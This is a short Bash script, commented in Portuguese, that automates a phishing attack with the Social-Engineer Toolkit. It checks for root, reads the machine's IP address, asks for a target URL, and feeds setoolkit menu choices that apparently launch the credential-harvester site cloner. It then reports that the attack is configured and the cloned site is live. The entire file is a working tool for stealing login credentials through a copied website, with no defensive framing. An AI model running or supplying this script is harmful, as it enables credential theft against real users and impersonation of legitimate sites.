#!/bin/bash

# Verifica se o script está sendo executado como root
if [ "$(id -u)" != "0" ]; then
    echo "Este script precisa ser executado como root. Use 'sudo'." >&2
    exit 1
fi

# Verifica se o setoolkit está instalado
if ! command -v setoolkit &> /dev/null; then
    echo "SET não está instalado. Por favor, execute o script 'setup_environment.sh' antes." >&2
    exit 1
fi

# Obtem o endereço IP da máquina
IP=$(ifconfig | grep -w "inet" | grep -v "127.0.0.1" | awk '{print $2}' | head -n 1)

if [ -z "$IP" ]; then
    echo "Erro ao obter o endereço IP. Certifique-se de que sua rede está configurada corretamente." >&2
    exit 1
fi

# Solicita a URL alvo ao usuário
read -p "Digite a URL do site que será clonado (ex.: http://example.com): " TARGET_URL

# Valida a URL
if [[ ! "$TARGET_URL" =~ ^http[s]?:// ]]; then
    echo "URL inválida. Certifique-se de incluir 'http://' ou 'https://'."
    exit 1
fi

# Informações do ataque
echo "URL alvo configurada: $TARGET_URL"
echo "Endereço IP local: $IP"

# Inicia o SET em modo de ataque configurado
echo "Iniciando o SET com as opções configuradas..."
cat <<EOF | setoolkit
1
2
3
2
$IP
$TARGET_URL
EOF

echo "Ataque configurado. O site clonado está disponível em: http://$IP"
